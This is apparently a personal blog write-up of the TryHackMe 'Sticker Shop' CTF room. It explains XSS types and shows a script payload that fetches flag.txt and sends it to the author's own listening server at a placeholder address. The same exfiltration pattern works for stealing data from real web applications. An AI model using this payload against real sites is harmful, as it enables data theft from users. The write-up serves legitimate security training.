---
title: "TryHackMe - The Sticker Shop"
date: 2025-03-09 22:00:00 +0000
author: scr4tcher
categories: [TryHackMe CTF]
tags: [xss,web exploitation,payload incjection]

---

## Introduction 

In this post, I’ll walk you through how I successfully exploited a Cross-Site Scripting (XSS) vulnerability to steal a flag from a vulnerable web application. My goal was to retrieve the flag from http://10.10.x.x:8080/flag.txt and send it to my own server for capture.

## 1. Understanding XSS

Cross-Site Scripting (XSS) is a web vulnerability that allows attackers to inject and execute malicious JavaScript in a victim’s browser. There are three common types of XSS:

- Stored XSS – The malicious script is stored in the application’s database and executed when a user visits a certain page.
- Reflected XSS – The script is injected via a URL or form input and executed immediately upon interaction.
- DOM-based XSS – The vulnerability exists in the client-side JavaScript, dynamically modifying the webpage.

<br>In my case, I found a vulnerable application that allowed me to inject and execute JavaScript.

## 2. My goals

<Br>✅ Retrieve the content of flag.txt from the vulnerable server.
<br>✅ Send the content to our own server.
<br>✅ Execute the malicious script via XSS in the victim’s browser.



## 3. Receiving the flag on my server

To capture the stolen flag, I set up a simple HTTP server using Python:

```bash
python3 -m http.server 9000
```

This server listened on port 9000, and as soon as the XSS payload executed, I received the flag in my server logs.


## 4. XSS Payload

```html
<script>
fetch('http://127.0.0.1:8080/flag.txt')  // Fetch the flag from the target server
  .then(response => response.text())  // Convert the response to text
  .then(flag => {
    fetch('http://YOUR_IP:9000/?flag=' + encodeURIComponent(flag));  // Send the flag to our server
  });
</script>

```

How the exploit worked ? 

 **Injecting the Payload** – I placed the above JavaScript in an input field that the application rendered as HTML, executing my script.
<Br>**Fetching the Flag** – my script made an HTTP request (fetch) to 10.10.x.x:8080/flag.txt, retrieving its contents.
<br>**Processing the Response** – The server returned the flag, and my script converted it into text.
**Exfiltrating the Flag** – Finally, my script sent the flag to my own server via an HTTP request.

## Conclusion

By leveraging an XSS vulnerability, I was able to execute arbitrary JavaScript in the victim’s browser and steal sensitive data. This demonstrates how dangerous unprotected web applications can be and why proper security measures are critical.